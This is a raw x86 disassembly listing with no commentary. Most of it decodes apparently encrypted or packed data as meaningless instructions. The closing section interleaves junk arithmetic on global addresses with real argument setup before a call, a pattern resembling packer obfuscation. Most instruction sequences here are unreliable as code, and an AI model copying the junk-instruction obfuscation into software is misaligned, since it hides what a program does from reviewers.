  41b14f:	mov    WORD PTR [edx+0x1949c05a],ds
  41b155:	ins    BYTE PTR es:[edi],dx
  41b156:	cmp    DWORD PTR [eax+0x30],ebp
  41b159:	in     eax,0x3a
  41b15b:	fwait
  41b15c:	mov    WORD PTR [ecx-0x35],?
  41b15f:	ret    
  41b160:	sbb    BYTE PTR [ebx+0x7766edd3],al
  41b166:	cmp    ch,BYTE PTR ds:0xe4ec4bd7
  41b16c:	sub    DWORD PTR cs:[eax-0x46dcc3e9],ecx
  41b173:	cwde   
  41b174:	ffreep st(5)
  41b176:	push   ecx
  41b177:	cdq    
  41b178:	xlat   BYTE PTR ds:[ebx]
  41b179:	popf   
  41b17a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b17b:	mov    WORD PTR [edi+0x16],gs
  41b17e:	rol    BYTE PTR [esi+eax*1],1
  41b181:	in     al,dx
  41b182:	out    dx,eax
  41b183:	test   al,0xe7
  41b185:	adc    dh,BYTE PTR ds:[edx+0x1]
  41b189:	or     dl,ch
  41b18b:	in     eax,dx
  41b18c:	dec    esp
  41b18d:	lods   eax,DWORD PTR ds:[esi]
  41b18e:	jae    0x41b14b
  41b190:	jo     0x41b1bf
  41b192:	mov    ds:0xaaac5f61,al
  41b197:	cmp    al,0x9e
  41b199:	aam    0xd6
  41b19b:	mov    BYTE PTR ds:0x109998bb,bl
  41b1a1:	cdq    
  41b1a2:	rcl    BYTE PTR [ebx],cl
  41b1a4:	mov    al,0x87
  41b1a6:	clc    
  41b1a7:	mov    bh,0x84
  41b1a9:	xchg   ecx,eax
  41b1aa:	pop    ds
  41b1ab:	test   eax,0x3f44edc8
  41b1b0:	dec    eax
  41b1b1:	cmc    
  41b1b2:	pop    edx
  41b1b3:	push   0xa7cd2d16
  41b1b8:	add    bl,BYTE PTR [edx-0x672b5941]
  41b1be:	fmul   DWORD PTR [edi-0x60]
  41b1c1:	mov    edx,0x51318f53
  41b1c6:	inc    esp
  41b1c7:	xchg   DWORD PTR [esi-0x27],edi
  41b1ca:	pushf  
  41b1cb:	cmp    eax,0x6ce9e248
  41b1d0:	xchg   ebx,eax
  41b1d1:	adc    al,0x5
  41b1d3:	pop    ebx
  41b1d4:	push   0xe71db08e
  41b1d9:	out    dx,eax
  41b1da:	and    cl,BYTE PTR [ecx-0x14d8e562]
  41b1e0:	popf   
  41b1e1:	sub    ebx,ebx
  41b1e3:	and    eax,0x25b5cd7a
  41b1e8:	(bad)  
  41b1e9:	sbb    eax,0x14f513ba
  41b1ee:	jne    0x41b190
  41b1f0:	mov    al,ds:0x71004d88
  41b1f5:	or     edx,DWORD PTR [edi-0x54]
  41b1f8:	scas   eax,DWORD PTR es:[edi]
  41b1f9:	mov    cl,bh
  41b1fb:	sbb    al,0xe6
  41b1fd:	and    DWORD PTR [eax+eax*2+0xf],ebx
  41b201:	push   cs
  41b202:	inc    ebx
  41b203:	or     al,0xa3
  41b205:	or     BYTE PTR [eax-0x4],0x4c
  41b209:	push   esp
  41b20a:	pop    esp
  41b20b:	pop    ds
  41b20c:	test   al,0xea
  41b20e:	xor    eax,0xd56009d
  41b213:	mov    edx,0x64e4d775
  41b218:	daa    
  41b219:	jno    0x41b1bf
  41b21b:	jg     0x41b27f
  41b21d:	push   ds
  41b21e:	push   0xffffffd1
  41b220:	sete   BYTE PTR [edx+ecx*1+0x1cec39c3]
  41b228:	xor    esi,DWORD PTR [esi]
  41b22a:	fwait
  41b22b:	test   al,0x5d
  41b22d:	or     al,0x3e
  41b22f:	shl    DWORD PTR [edi],0x60
  41b232:	jno    0x41b27c
  41b234:	adc    DWORD PTR [edx-0xd738883],esi
  41b23a:	xchg   esi,eax
  41b23b:	repnz push ebx
  41b23d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b23e:	call   0xb013505d
  41b243:	push   edx
  41b244:	(bad)  
  41b245:	sahf   
  41b246:	int    0xbb
  41b248:	pop    es
  41b249:	jo     0x41b2c9
  41b24b:	cmp    ecx,DWORD PTR [ebx]
  41b24d:	pop    edx
  41b24e:	jmp    0x2c7b7602
  41b253:	or     al,0x7a
  41b255:	mov    dh,0xb9
  41b257:	mov    eax,0xbf91ebce
  41b25c:	dec    ebp
  41b25d:	mov    bh,0x20
  41b25f:	mov    bh,0x34
  41b261:	lds    esi,FWORD PTR [edx+0x45635819]
  41b267:	mov    eax,0xa061fc0a
  41b26c:	mov    ds:0x2eebaf72,eax
  41b271:	fyl2x  
  41b273:	xchg   DWORD PTR [edx],esp
  41b275:	jno    0x41b2ec
  41b277:	inc    ebp
  41b278:	ds mov ah,0xf1
  41b27b:	leave  
  41b27c:	jbe    0x41b2d4
  41b27e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b27f:	scas   al,BYTE PTR es:[edi]
  41b280:	xor    eax,0x14af2dcf
  41b285:	mov    dl,0x72
  41b287:	pop    edx
  41b288:	mov    edi,0x4e177ad2
  41b28d:	int    0x8a
  41b28f:	xor    DWORD PTR [edi-0x2a],esp
  41b292:	sbb    DWORD PTR [edx+0x5c],ebp
  41b295:	das    
  41b296:	push   0xe3cfb0c3
  41b29b:	cmp    BYTE PTR [edi+ecx*8],al
  41b29e:	xlat   BYTE PTR ds:[ebx]
  41b29f:	dec    eax
  41b2a0:	es rcl al,0x2d
  41b2a4:	aas    
  41b2a5:	mov    bl,0x25
  41b2a7:	add    al,0x85
  41b2a9:	adc    eax,0x5f9a008
  41b2ae:	and    DWORD PTR [edi-0x1e19d6e1],edx
  41b2b4:	aaa    
  41b2b5:	dec    ebx
  41b2b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b2b7:	fldcw  WORD PTR [edi]
  41b2b9:	mul    dh
  41b2bb:	(bad)  
  41b2bc:	xchg   ebp,eax
  41b2bd:	xor    al,0xd
  41b2bf:	pop    edi
  41b2c0:	jp     0x41b31d
  41b2c2:	sar    BYTE PTR [eax+0x14],0xbb
  41b2c6:	jnp    0x41b312
  41b2c8:	add    eax,0xeb047a3f
  41b2cd:	rcl    BYTE PTR [edi-0x59],0xdc
  41b2d1:	lock es dec edx
  41b2d4:	test   al,0x4f
  41b2d6:	pop    edx
  41b2d7:	test   edi,ebx
  41b2d9:	mov    cl,0xaa
  41b2db:	clc    
  41b2dc:	leave  
  41b2dd:	or     edi,DWORD PTR [ebp+0xe]
  41b2e0:	adc    ecx,DWORD PTR [esi+0x1f]
  41b2e3:	mov    al,ds:0x7d0ac48b
  41b2e8:	mov    dh,0xe2
  41b2ea:	ds iret 
  41b2ec:	sar    DWORD PTR [eax+0x6a],1
  41b2ef:	push   ebx
  41b2f0:	xchg   edi,eax
  41b2f1:	call   0x34c26e
  41b2f6:	dec    ecx
  41b2f7:	pushf  
  41b2f8:	leave  
  41b2f9:	mov    WORD PTR [edi],?
  41b2fb:	jge    0x41b35f
  41b2fd:	add    DWORD PTR [ebp+ebx*1+0x71],esi
  41b301:	ins    DWORD PTR es:[edi],dx
  41b302:	add    DWORD PTR [eax*4-0x1c917c58],esp
  41b309:	pop    edx
  41b30a:	add    al,0xc
  41b30c:	stos   DWORD PTR es:[edi],eax
  41b30d:	in     al,dx
  41b30e:	sahf   
  41b30f:	daa    
  41b310:	xchg   edx,eax
  41b311:	ins    BYTE PTR es:[edi],dx
  41b312:	arpl   WORD PTR [ebx+0x6e7a64fa],ax
  41b318:	or     dh,BYTE PTR [edi-0x73]
  41b31b:	and    DWORD PTR [ebx],ebx
  41b31d:	retf   0x910c
  41b320:	call   0xd39038b5
  41b325:	in     eax,0xd0
  41b327:	sub    al,0x1a
  41b329:	imul   ebx,DWORD PTR ds:0x6b4d1d8b,0x7e
  41b330:	jg     0x41b2db
  41b332:	cmp    edx,esi
  41b334:	or     ecx,edi
  41b336:	sbb    DWORD PTR [edi+0x3d5040a0],0x61
  41b33d:	or     eax,0x5d767a65
  41b342:	xchg   DWORD PTR [edx-0x63],esp
  41b345:	xor    al,bl
  41b347:	imul   esp,edx,0xbc439f28
  41b34d:	push   0xf
  41b34f:	xchg   ebp,eax
  41b350:	fisub  DWORD PTR [eax+0x65c17775]
  41b356:	mov    bh,BYTE PTR [edi-0x2a]
  41b359:	outs   dx,BYTE PTR ds:[esi]
  41b35a:	loop   0x41b37c
  41b35c:	std    
  41b35d:	scas   al,BYTE PTR es:[edi]
  41b35e:	inc    ecx
  41b35f:	xlat   BYTE PTR ds:[ebx]
  41b360:	shl    DWORD PTR [esi],cl
  41b362:	enter  0xf345,0x52
  41b366:	in     eax,dx
  41b367:	mov    WORD PTR [edi+edi*4+0x48c63444],?
  41b36e:	mov    ah,0xb1
  41b370:	(bad)  
  41b371:	nop
  41b372:	push   ds
  41b373:	or     DWORD PTR [ebx],esi
  41b375:	sbb    edx,0x7bd94eac
  41b37b:	cli    
  41b37c:	(bad)  
  41b37d:	and    BYTE PTR [eax+0x3f],ch
  41b380:	out    0x59,eax
  41b382:	mov    bl,0xc0
  41b384:	inc    ebx
  41b385:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b386:	sub    al,BYTE PTR [edi]
  41b388:	and    eax,0xb78924fb
  41b38d:	xchg   esi,eax
  41b38e:	fdivr  DWORD PTR [ebx-0x2d41d785]
  41b394:	outs   dx,DWORD PTR ss:[esi]
  41b396:	pop    ss
  41b397:	jno    0x41b350
  41b399:	dec    ecx
  41b39a:	xchg   ebx,esp
  41b39c:	sub    DWORD PTR ds:0xc79ae40f,0x5ef43791
  41b3a6:	pop    ebx
  41b3a7:	sub    al,0x5b
  41b3a9:	jb     0x41b35f
  41b3ab:	mov    bl,0x8d
  41b3ad:	test   eax,0xa77b825a
  41b3b2:	sub    al,0x56
  41b3b4:	inc    esi
  41b3b5:	inc    esi
  41b3b6:	push   edx
  41b3b7:	jne    0x41b3a4
  41b3b9:	sub    cl,BYTE PTR [ebx+0x4c]
  41b3bc:	outs   dx,BYTE PTR ds:[esi]
  41b3bd:	lods   al,BYTE PTR ds:[esi]
  41b3be:	xchg   ebx,eax
  41b3bf:	mov    eax,gs
  41b3c1:	dec    esp
  41b3c2:	stos   DWORD PTR es:[edi],eax
  41b3c3:	aaa    
  41b3c4:	sbb    ebp,DWORD PTR [edi]
  41b3c6:	mov    ebx,0x9d6664c1
  41b3cb:	fstp   QWORD PTR [ebp+0x75]
  41b3ce:	(bad)  
  41b3cf:	shrd   esp,esi,cl
  41b3d2:	xchg   bl,bh
  41b3d4:	sbb    BYTE PTR [ecx],dl
  41b3d6:	mov    ds,WORD PTR [ebp-0x2db4bd2c]
  41b3dc:	push   0x7133c178
  41b3e1:	inc    ebx
  41b3e2:	cmp    DWORD PTR [ebp+0x7cf8f889],ecx
  41b3e8:	fwait
  41b3e9:	sbb    al,0x4d
  41b3eb:	jp     0x41b41b
  41b3ed:	mov    bh,0xc7
  41b3ef:	mov    ebp,0xb4537a84
  41b3f4:	push   esp
  41b3f5:	add    eax,0x4828ada3
  41b3fa:	icebp  
  41b3fb:	dec    ebp
  41b3fc:	cmp    DWORD PTR [edi+ecx*4+0x43],esp
  41b400:	outs   dx,BYTE PTR ds:[esi]
  41b401:	les    esi,FWORD PTR [edx+0x45]
  41b404:	adc    dl,ah
  41b406:	rcr    BYTE PTR [ecx],1
  41b408:	xchg   edi,eax
  41b409:	adc    DWORD PTR [eax-0x10],esi
  41b40c:	les    ebp,FWORD PTR [ebx]
  41b40e:	pop    edi
  41b40f:	pop    ds
  41b410:	cld    
  41b411:	fs inc edi
  41b413:	sbb    ch,cl
  41b415:	xchg   esi,eax
  41b416:	stos   BYTE PTR es:[edi],al
  41b417:	aam    0xfd
  41b419:	push   edx
  41b41a:	mov    eax,DWORD PTR [ebp-0xa264695]
  41b420:	xor    dh,bl
  41b422:	rcr    DWORD PTR ds:0x8d9755bf,1
  41b428:	sub    BYTE PTR [eax-0x341a64f8],ch
  41b42e:	jmp    0x81cfe323
  41b433:	jp     0x41b434
  41b435:	pop    ss
  41b436:	mov    esi,DWORD PTR [eax-0x2c]
  41b439:	scas   al,BYTE PTR es:[edi]
  41b43a:	ret    0x542
  41b43d:	aam    0xde
  41b43f:	das    
  41b440:	leave  
  41b441:	sbb    al,0xe1
  41b443:	test   DWORD PTR [edx+0x7c3775fd],0xcc3cbc4a
  41b44d:	jb     0x41b3f9
  41b44f:	xchg   ecx,eax
  41b450:	stc    
  41b451:	ins    DWORD PTR es:[edi],dx
  41b452:	daa    
  41b453:	cmp    BYTE PTR [ecx],al
  41b455:	adc    DWORD PTR [esp+0x3f],ecx
  41b459:	push   edi
  41b45a:	mov    bh,0x2c
  41b45c:	mov    al,0xc6
  41b45e:	mov    BYTE PTR [esi],bh
  41b460:	inc    ebp
  41b461:	mov    dh,0xc1
  41b463:	xlat   BYTE PTR ds:[ebx]
  41b464:	xor    cl,bl
  41b466:	stos   BYTE PTR es:[edi],al
  41b467:	mov    esi,0x4282e2f8
  41b46c:	jmp    0x15a3:0xa841e50f
  41b473:	ss xchg esp,eax
  41b475:	xchg   ecx,eax
  41b476:	sahf   
  41b477:	hlt    
  41b478:	mov    al,ds:0x614472c4
  41b47d:	mov    DWORD PTR [ebp+0x30],edx
  41b480:	sub    ah,BYTE PTR [esp+esi*4-0x1d498cde]
  41b487:	pusha  
  41b488:	or     BYTE PTR [ebp+0x7a82c8cf],0x97
  41b48f:	lds    esi,FWORD PTR [ecx]
  41b491:	test   BYTE PTR [ebx+0x28],ch
  41b494:	jmp    0x2fcab944
  41b499:	mov    eax,ds:0xa0ad8f23
  41b49e:	call   0x8a10:0x1221d61a
  41b4a5:	std    
  41b4a6:	loop   0x41b516
  41b4a8:	inc    edi
  41b4a9:	shr    BYTE PTR [edx+eiz*8+0x6e],0xd0
  41b4ae:	mov    al,0xee
  41b4b0:	fsub   st,st(3)
  41b4b2:	rcl    DWORD PTR [edx],0x9c
  41b4b5:	cmp    ebp,0x61
  41b4b8:	jno    0x41b499
  41b4ba:	(bad)  
  41b4bb:	icebp  
  41b4bc:	fbstp  TBYTE PTR [ebx+0x4309e196]
  41b4c2:	pop    ebp
  41b4c3:	sub    eax,0xeb046e3e
  41b4c8:	sbb    al,0xc1
  41b4ca:	add    al,cl
  41b4cc:	xchg   esi,eax
  41b4cd:	out    dx,eax
  41b4ce:	ret    
  41b4cf:	test   al,0x4e
  41b4d1:	shr    DWORD PTR [edi],0xcd
  41b4d4:	in     eax,0xd9
  41b4d6:	ins    DWORD PTR es:[edi],dx
  41b4d7:	and    eax,0xd95106a9
  41b4dc:	imul   eax,DWORD PTR [ebx],0x5408a9f3
  41b4e2:	xchg   ecx,eax
  41b4e3:	dec    ebp
  41b4e4:	push   eax
  41b4e5:	sbb    al,0x1e
  41b4e7:	cdq    
  41b4e8:	jno    0x41b48b
  41b4ea:	in     al,dx
  41b4eb:	retf   
  41b4ec:	mov    edx,0x5592cc30
  41b4f1:	fstp   st(2)
  41b4f3:	ds daa 
  41b4f5:	push   0x77147197
  41b4fa:	aas    
  41b4fb:	cwde   
  41b4fc:	jge    0x41b4cd
  41b4fe:	and    dh,BYTE PTR [ecx]
  41b500:	pop    esp
  41b501:	dec    esp
  41b502:	add    eax,0xc0b71120
  41b507:	add    al,0xda
  41b509:	xchg   ebp,eax
  41b50b:	xchg   edi,eax
  41b50c:	jns    0x41b4c1
  41b50e:	rcr    BYTE PTR [edi],0xfe
  41b511:	xor    DWORD PTR cs:[edi+eiz*1+0x43],eax
  41b516:	mov    eax,0x35d9fa2c
  41b51b:	or     al,0x50
  41b51d:	adc    eax,0x8f594caf
  41b522:	push   es
  41b523:	jno    0x41b538
  41b525:	xchg   esi,eax
  41b526:	aad    0xc4
  41b528:	gs dec edi
  41b52a:	or     edi,DWORD PTR [edx]
  41b52c:	stos   BYTE PTR es:[edi],al
  41b52d:	push   edi
  41b52e:	fnstcw WORD PTR [edi+0x70d525f5]
  41b534:	ins    DWORD PTR es:[edi],dx
  41b535:	sbb    al,0x6f
  41b537:	lods   eax,DWORD PTR ds:[esi]
  41b538:	clc    
  41b539:	js     0x41b510
  41b53b:	cmp    BYTE PTR [ecx-0x77],al
  41b53e:	xchg   edi,eax
  41b53f:	push   ecx
  41b540:	fbld   TBYTE PTR [eax+0x4e]
  41b543:	cmp    esi,DWORD PTR [ecx]
  41b545:	dec    ebp
  41b546:	dec    eax
  41b547:	lahf   
  41b548:	mov    eax,ds:0x6ce40489
  41b54d:	pop    ecx
  41b54e:	mov    esi,0x661e1717
  41b553:	jge    0x41b5a9
  41b555:	jae    0x41b5cb
  41b557:	enter  0x5d09,0xc4
  41b55b:	out    0x96,eax
  41b55d:	jge    0x41b589
  41b55f:	inc    esi
  41b560:	sub    eax,0x6403d6be
  41b565:	out    0x42,eax
  41b567:	imul   eax,DWORD PTR [edx+0x1c],0xffffffe1
  41b56b:	mov    ebx,0x1659bb9e
  41b570:	lock (bad) 
  41b572:	inc    ebp
  41b573:	or     DWORD PTR [ecx+0x4f0db4ba],esp
  41b579:	or     DWORD PTR [eax-0x770359dd],0x2c51974a
  41b583:	cmp    eax,0xc6555cb8
  41b588:	inc    ebp
  41b589:	out    0xb3,al
  41b58b:	pop    ss
  41b58c:	aaa    
  41b58d:	dec    edi
  41b58e:	test   DWORD PTR [ecx+eax*8],esi
  41b591:	pop    esi
  41b592:	into   
  41b593:	ds je  0x41b539
  41b596:	test   al,0x66
  41b598:	outs   dx,DWORD PTR ds:[esi]
  41b599:	pop    ebx
  41b59a:	aas    
  41b59b:	sub    ebx,DWORD PTR [ebp+0x4fdd3bca]
  41b5a1:	jb     0x41b5c8
  41b5a3:	pop    ss
  41b5a4:	add    ebp,DWORD PTR [esi+0x113643e4]
  41b5aa:	(bad)  
  41b5ab:	cmc    
  41b5ac:	push   DWORD PTR [esi+0x2a1fc3]
  41b5b2:	or     DWORD PTR [edi],ebx
  41b5b4:	pop    esp
  41b5b5:	xchg   esi,eax
  41b5b6:	push   es
  41b5b7:	mov    cl,BYTE PTR [edi+0x320d85a2]
  41b5bd:	xor    ebp,DWORD PTR [ecx]
  41b5bf:	dec    edx
  41b5c0:	out    dx,al
  41b5c1:	test   BYTE PTR [eax],dh
  41b5c3:	xchg   esp,eax
  41b5c4:	push   edi
  41b5c5:	cmp    eax,DWORD PTR [esi-0x27ed45b9]
  41b5cb:	mov    esp,0x499a7d58
  41b5d0:	and    esp,DWORD PTR [ebx-0x7076e53c]
  41b5d6:	and    DWORD PTR fs:[ebx],eax
  41b5d9:	pop    ebp
  41b5da:	test   DWORD PTR [esp+eax*8],ebx
  41b5dd:	mov    edi,0xe5186cb7
  41b5e2:	(bad)  
  41b5e3:	icebp  
  41b5e4:	jle    0x41b5bc
  41b5e6:	popa   
  41b5e7:	hlt    
  41b5e8:	xor    DWORD PTR [ebp+0x5d],ebx
  41b5eb:	int    0x76
  41b5ed:	in     al,0xa3
  41b5ef:	xchg   edi,eax
  41b5f0:	popf   
  41b5f1:	push   ss
  41b5f2:	in     al,dx
  41b5f3:	adc    BYTE PTR [ebx-0xa62adf5],dh
  41b5f9:	ret    0xc001
  41b5fc:	mov    ds:0xe6308f7d,eax
  41b601:	inc    eax
  41b602:	cld    
  41b603:	std    
  41b604:	mov    al,ds:0xaeed5af3
  41b609:	js     0x41b5e9
  41b60b:	popf   
  41b60c:	adc    DWORD PTR [ebx+0xb],eax
  41b60f:	shr    BYTE PTR [ecx],1
  41b611:	je     0x41b5de
  41b613:	cli    
  41b614:	sub    esp,DWORD PTR [edi]
  41b616:	cmp    ebp,DWORD PTR [edx]
  41b618:	xchg   ebp,eax
  41b619:	and    al,0xb3
  41b61b:	push   ebp
  41b61c:	(bad)  
  41b61d:	out    0x5d,al
  41b61f:	sahf   
  41b620:	rol    ebp,cl
  41b622:	enter  0xb103,0xd7
  41b626:	std    
  41b627:	fld    QWORD PTR [esi+0x13]
  41b62a:	retf   
  41b62b:	out    0xd2,al
  41b62d:	add    bl,BYTE PTR [ebx+eax*2+0x31]
  41b631:	jmp    0xaec0:0xa62129ef
  41b638:	in     eax,dx
  41b639:	rcl    DWORD PTR [eax+0x42],1
  41b63c:	jl     0x41b5dc
  41b63e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b63f:	add    BYTE PTR [esi],bl
  41b641:	cs push edi
  41b643:	or     BYTE PTR [edx+0x46],dl
  41b646:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b647:	mov    bl,0x42
  41b649:	mov    al,0x67
  41b64b:	jno    0x41b631
  41b64d:	push   0x49
  41b64f:	jo     0x41b68f
  41b651:	xor    BYTE PTR [edi-0x6d],0x14
  41b655:	ins    BYTE PTR es:[edi],dx
  41b656:	stos   DWORD PTR es:[edi],eax
  41b657:	aas    
  41b658:	mov    edi,DWORD PTR [edi+0x6]
  41b65b:	gs xchg esp,eax
  41b65d:	and    bl,BYTE PTR [ebp-0x49017a4d]
  41b663:	add    al,0xe1
  41b665:	and    ch,BYTE PTR [ecx]
  41b667:	mov    ebx,0xa037d866
  41b66c:	das    
  41b66d:	sub    BYTE PTR [esi-0x68c10734],bl
  41b673:	loope  0x41b694
  41b675:	sbb    eax,0x1782dcf3
  41b67a:	jmp    0x56840d04
  41b67f:	test   al,0x6e
  41b681:	mov    ch,0x4c
  41b683:	lea    edi,[ecx]
  41b685:	or     eax,0x58f56cdf
  41b68a:	ins    BYTE PTR es:[edi],dx
  41b68b:	in     eax,0x1b
  41b68d:	enter  0x29a3,0x68
  41b691:	(bad)  [ebp-0x27]
  41b694:	(bad)  
  41b695:	mov    dh,0xb1
  41b697:	pop    es
  41b698:	ins    DWORD PTR es:[edi],dx
  41b699:	mov    BYTE PTR [edx-0x2ad007cd],ch
  41b69f:	xor    cl,BYTE PTR [ebx]
  41b6a1:	addr16 cs jne 0x41b6a2
  41b6a5:	ins    DWORD PTR es:[edi],dx
  41b6a6:	mov    ebp,0x5246a33c
  41b6ab:	jmp    0x41b69b
  41b6ad:	cld    
  41b6ae:	call   0x59f810b2
  41b6b3:	fild   QWORD PTR [edi+0x3f]
  41b6b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b6b7:	push   0xffffffa8
  41b6b9:	xchg   ebx,eax
  41b6ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b6bb:	pop    ds
  41b6bc:	sbb    bl,BYTE PTR [eax]
  41b6be:	rol    BYTE PTR [edi+0x32bc31d3],1
  41b6c4:	cmp    eax,0xa7992ec2
  41b6c9:	cmp    bh,BYTE PTR [ebp-0x70]
  41b6cc:	sub    ebx,DWORD PTR [edx+0x54ffdf17]
  41b6d2:	add    BYTE PTR [edx+0x6b3399c2],bl
  41b6d8:	xchg   BYTE PTR [ecx+0x13],al
  41b6db:	daa    
  41b6dc:	and    ebx,0x7f786c5c
  41b6e2:	pop    esi
  41b6e3:	lods   al,BYTE PTR ds:[esi]
  41b6e4:	in     al,dx
  41b6e5:	jne    0x41b6af
  41b6e7:	test   DWORD PTR [ebp-0x4284a863],ecx
  41b6ed:	mov    al,ds:0xaad87e
  41b6f2:	and    al,0x98
  41b6f4:	stos   BYTE PTR es:[edi],al
  41b6f5:	add    DWORD PTR [ebp-0x1a],ebx
  41b6f8:	in     al,dx
  41b6f9:	in     eax,0x38
  41b6fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b6fc:	mov    ebp,DWORD PTR [ebp-0x5eebf721]
  41b702:	sbb    eax,0x413b05f9
  41b707:	mov    ebx,0x28d78c02
  41b70c:	xchg   esp,eax
  41b70d:	lahf   
  41b70e:	xor    eax,edi
  41b710:	add    al,0xba
  41b712:	add    al,0x6a
  41b714:	test   DWORD PTR [eax-0x37],eax
  41b717:	mov    DWORD PTR [eax+0x4e],esi
  41b71a:	add    al,0x97
  41b71c:	push   cs
  41b71d:	and    eax,DWORD PTR [eax-0x56]
  41b720:	cli    
  41b721:	cmovl  ecx,DWORD PTR [eax+eax*2+0x259664d4]
  41b729:	xor    dh,BYTE PTR [edi-0x3c]
  41b72c:	sahf   
  41b72d:	ins    BYTE PTR es:[edi],dx
  41b72e:	or     BYTE PTR [edx-0x533850d8],al
  41b734:	jno    0x41b770
  41b736:	retf   0x90be
  41b739:	or     ah,al
  41b73b:	stos   BYTE PTR es:[edi],al
  41b73c:	in     al,dx
  41b73d:	mov    ch,0x4b
  41b73f:	mov    cl,0x30
  41b741:	leave  
  41b742:	mov    WORD PTR [ebx+eiz*1-0x6c26c5f8],ss
  41b749:	sbb    eax,DWORD PTR [edx]
  41b74b:	jo     0x41b781
  41b74d:	mov    edi,0xa537d2ac
  41b752:	call   0x7ad93d1a
  41b757:	nop
  41b758:	push   ecx
  41b759:	jp     0x41b713
  41b75b:	test   al,0xd7
  41b75d:	loope  0x41b725
  41b75f:	jbe    0x41b718
  41b761:	push   ebp
  41b762:	mov    al,ds:0xdc92b619
  41b767:	xor    eax,0x1a092596
  41b76c:	and    ch,ah
  41b76e:	adc    ecx,0x75
  41b771:	scas   al,BYTE PTR es:[edi]
  41b772:	sbb    eax,0xd43556a1
  41b777:	mov    bh,BYTE PTR [esp+edx*8]
  41b77a:	pop    es
  41b77b:	shr    BYTE PTR [ecx-0x12f3e079],0x4d
  41b782:	jo     0x41b791
  41b784:	inc    esi
  41b785:	mov    edx,DWORD PTR [ecx-0x1db3f733]
  41b78b:	pop    ecx
  41b78c:	imul   esi,ecx,0x4f5c28ae
  41b792:	adc    BYTE PTR [edi],dl
  41b794:	mov    ?,WORD PTR [ebp+0x3e1cd02a]
  41b79a:	adc    ebp,DWORD PTR [ecx-0x77d9b947]
  41b7a0:	pop    edx
  41b7a1:	jecxz  0x41b7ad
  41b7a3:	push   0xae99d3be
  41b7a8:	scas   al,BYTE PTR es:[edi]
  41b7a9:	inc    ah
  41b7ab:	pop    ecx
  41b7ac:	add    eax,0x5cf91cc3
  41b7b1:	adc    BYTE PTR [esi],ah
  41b7b3:	push   ds
  41b7b4:	cmp    al,0x87
  41b7b6:	arpl   WORD PTR [edi+0x2783aabe],cx
  41b7bc:	test   DWORD PTR [edi+0x2],ecx
  41b7bf:	mov    eax,ds:0x85786089
  41b7c4:	popf   
  41b7c5:	xchg   ecx,eax
  41b7c6:	int3   
  41b7c7:	bnd ds jg 0x41b797
  41b7cb:	or     ah,BYTE PTR [edi]
  41b7cd:	jnp    0x41b7eb
  41b7cf:	adc    esi,DWORD PTR [ecx+0x428b34af]
  41b7d5:	lock mov al,0xd2
  41b7d8:	ficom  WORD PTR [esi+0x3e]
  41b7db:	imul   edx,esi,0x7e
  41b7de:	stc    
  41b7df:	mov    dl,0xff
  41b7e1:	cmp    ah,BYTE PTR [edx+0xcb15bff]
  41b7e7:	bound  eax,QWORD PTR ds:0x4fe46a3e
  41b7ed:	pop    ebx
  41b7ee:	sub    BYTE PTR [edi-0x54],ah
  41b7f1:	pop    edi
  41b7f2:	push   cs
  41b7f3:	iret   
  41b7f4:	cmp    edi,DWORD PTR [esi+0x3929e10]
  41b7fa:	je     0x41b79d
  41b7fc:	std    
  41b7fd:	add    al,0x3e
  41b7ff:	pop    eax
  41b800:	dec    esi
  41b801:	jge    0x41b834
  41b803:	xchg   edx,eax
  41b804:	cmc    
  41b805:	aaa    
  41b806:	sub    eax,0x6978b96a
  41b80b:	ja     0x41b876
  41b80d:	pushf  
  41b80e:	inc    esi
  41b80f:	add    eax,0xab079a0b
  41b814:	scas   al,BYTE PTR es:[edi]
  41b815:	ins    DWORD PTR es:[edi],dx
  41b816:	xor    esp,DWORD PTR [edi]
  41b818:	jmp    0x267dc749
  41b81d:	dec    ebx
  41b81e:	add    eax,0xbc637dca
  41b823:	xchg   edx,eax
  41b824:	mov    ebp,0x173d942f
  41b829:	into   
  41b82a:	xor    DWORD PTR [esi],esp
  41b82c:	adc    DWORD PTR [edx-0x46],edi
  41b82f:	xchg   esi,eax
  41b830:	or     cl,BYTE PTR ds:0xf1463664
  41b836:	out    dx,eax
  41b837:	ror    DWORD PTR [esi+0x22ab7b7c],cl
  41b83d:	push   edx
  41b83e:	mov    ch,0x68
  41b840:	adc    DWORD PTR [ebx+0x65],ebx
  41b843:	mov    edx,0x4eac3af9
  41b848:	repz mov esp,0x8b7c13ee
  41b84e:	dec    ebp
  41b84f:	cld    
  41b850:	and    DWORD PTR ds:0x428ec3,0x32ec
  41b85a:	sub    eax,ecx
  41b85c:	mov    DWORD PTR [ebp-0x4],eax
  41b85f:	add    DWORD PTR ds:0x428e6b,0x1dd5
  41b869:	or     DWORD PTR [ebp-0x4],0xf89c85a0
  41b870:	xor    DWORD PTR ds:0x428e7f,ebx
  41b876:	mov    eax,DWORD PTR [ebp-0xc]
  41b879:	dec    DWORD PTR ds:0x428e67
  41b87f:	xor    eax,esi
  41b881:	or     DWORD PTR ds:0x428e33,0x9ab
  41b88b:	add    eax,edi
  41b88d:	push   eax
  41b88e:	mov    eax,DWORD PTR [ebp-0x10]
  41b891:	xor    eax,esi
  41b893:	add    DWORD PTR ds:0x428eab,0x428e6b
  41b89d:	add    eax,edi
  41b89f:	and    DWORD PTR ds:0x428e67,0x428e87
  41b8a9:	push   eax
  41b8aa:	mov    eax,DWORD PTR [ebp-0x4]
  41b8ad:	or     DWORD PTR ds:0x428e2b,0x148
  41b8b7:	xor    eax,esi
  41b8b9:	xor    DWORD PTR ds:0x428e83,0x7f59
  41b8c3:	add    eax,0x3272fa
  41b8c8:	push   eax
  41b8c9:	lea    eax,[ebp-0x78]
  41b8cc:	push   eax
  41b8cd:	push   DWORD PTR [ebp-0x2c]
  41b8d0:	push   DWORD PTR [ebp-0x28]
  41b8d3:	call   0x411af5
  41b8d8:	test   eax,eax
  41b8da:	je     0x41b908
  41b8e0:	lea    eax,[ebp-0x78]
  41b8e3:	push   eax
